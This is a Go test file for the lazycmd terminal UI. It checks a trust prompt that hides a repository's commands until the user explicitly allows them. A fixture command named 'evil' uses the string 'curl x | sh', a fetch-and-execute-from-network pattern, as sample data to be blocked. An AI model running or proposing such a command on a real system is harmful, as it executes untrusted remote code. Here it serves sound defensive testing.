package ui

import (
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"

	"lazycmd/internal/config"
	"lazycmd/internal/trust"
)

func trustFixture() (limited, full []config.Group, repoCmds []config.ResolvedCommand) {
	repoCmds = []config.ResolvedCommand{
		{ID: "project:evil", Name: "evil", Run: "curl x | sh"},
	}
	global := config.Group{Title: "Global", Commands: []config.ResolvedCommand{{ID: "global:mine", Name: "mine", Run: "true"}}}
	feature := config.Group{Title: "Discovered — git (.git)", Commands: []config.ResolvedCommand{{ID: "git:pull", Name: "git: pull", Run: "true"}}}
	limited = []config.Group{global, feature}
	full = []config.Group{global, {Title: "This project", Commands: repoCmds}, feature}
	return
}

func pendingModel(t *testing.T, stateDir, root string, state trust.State) Model {
	t.Helper()
	limited, full, repoCmds := trustFixture()
	m := New(limited, nil, stateDir, root).WithPendingTrust(PendingTrust{
		State: state, Commands: repoCmds, Fingerprint: "fp1", FullGroups: full,
	})
	updated, _ := m.Update(tea.WindowSizeMsg{Width: 120, Height: 34})
	return updated.(Model)
}

func TestTrustPromptHidesRepoCommandsUntilAllowed(t *testing.T) {
	stateDir, root := t.TempDir(), t.TempDir()
	m := pendingModel(t, stateDir, root, trust.Unknown)

	if !m.trustPromptOpen {
		t.Fatal("prompt should open at startup")
	}
	v := m.View()
	for _, want := range []string{"Allow this repo's commands?", "haven't allowed", "evil", "curl x | sh"} {
		if !strings.Contains(v, want) {
			t.Errorf("prompt should show %q; view:\n%s", want, v)
		}
	}
	labels := strings.Join(rowLabels(m), "|")
	if strings.Contains(labels, "evil") || !strings.Contains(labels, "1 not allowed: review…") {
		t.Fatalf("rows = %s", labels)
	}
	if labels != "Global|mine|This project|1 not allowed: review…|Discovered — git (.git)|git: pull" {
		t.Errorf("placeholder in the wrong place: %s", labels)
	}

	// enter is "not now": a stray enter can't allow anything.
	m, _ = sendKey(t, m, tea.KeyMsg{Type: tea.KeyEnter})
	if m.trustPromptOpen || strings.Contains(strings.Join(rowLabels(m), "|"), "evil") {
		t.Fatal("enter should close the prompt and keep the commands hidden")
	}
	if trust.Load(stateDir).Check(root, "fp1") != trust.Unknown {
		t.Fatal("declining must not remember anything")
	}

	// Selecting the placeholder reopens the prompt; y allows.
	for i, r := range m.rows {
		if r.cmd.ID == trustReviewID {
			m.cursor = i
		}
	}
	m, _ = sendKey(t, m, tea.KeyMsg{Type: tea.KeyEnter})
	if !m.trustPromptOpen {
		t.Fatal("selecting the placeholder should reopen the prompt")
	}
	m, _ = sendKey(t, m, tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("y")})
	labels = strings.Join(rowLabels(m), "|")
	if m.trustPromptOpen || !strings.Contains(labels, "evil") || strings.Contains(labels, "not allowed") {
		t.Fatalf("after y: open=%v rows=%s", m.trustPromptOpen, labels)
	}
	if got := trust.Load(stateDir).Check(root, "fp1"); got != trust.Allowed {
		t.Errorf("allow should be remembered, got %v", got)
	}
}

func TestTrustPromptSaysWhenCommandsChanged(t *testing.T) {
	m := pendingModel(t, t.TempDir(), t.TempDir(), trust.Changed)
	if v := m.View(); !strings.Contains(v, "changed since you allowed them") {
		t.Errorf("view:\n%s", v)
	}
}

func TestTrustPromptBlocksOtherKeys(t *testing.T) {
	m := pendingModel(t, t.TempDir(), t.TempDir(), trust.Unknown)
	for _, k := range []tea.KeyMsg{{Type: tea.KeyRunes, Runes: []rune("t")}, {Type: tea.KeyRunes, Runes: []rune("/")}, {Type: tea.KeyDown}} {
		m, _ = sendKey(t, m, k)
		if !m.trustPromptOpen || m.filtering || m.activeJob != nil {
			t.Fatalf("key %v leaked past the prompt", k)
		}
	}
	_, cmd := sendKey(t, m, tea.KeyMsg{Type: tea.KeyCtrlC})
	if cmd == nil {
		t.Error("ctrl+c should still quit")
	}
}

// Profile-included commands are the user's own and stay listed; the
// placeholder joins them in "This project".
func TestTrustPlaceholderJoinsIncludedCommands(t *testing.T) {
	limited := []config.Group{{Title: "This project", Commands: []config.ResolvedCommand{{ID: "project:inc", Name: "inc", Run: "true"}}}}
	m := New(limited, nil, t.TempDir(), t.TempDir()).WithPendingTrust(PendingTrust{
		Commands: []config.ResolvedCommand{{ID: "project:a", Name: "a"}, {ID: "project:b", Name: "b"}}, Fingerprint: "x", FullGroups: limited,
	})
	if got := strings.Join(rowLabels(m), "|"); got != "This project|2 not allowed: review…|inc" {
		t.Errorf("rows = %s", got)
	}
}
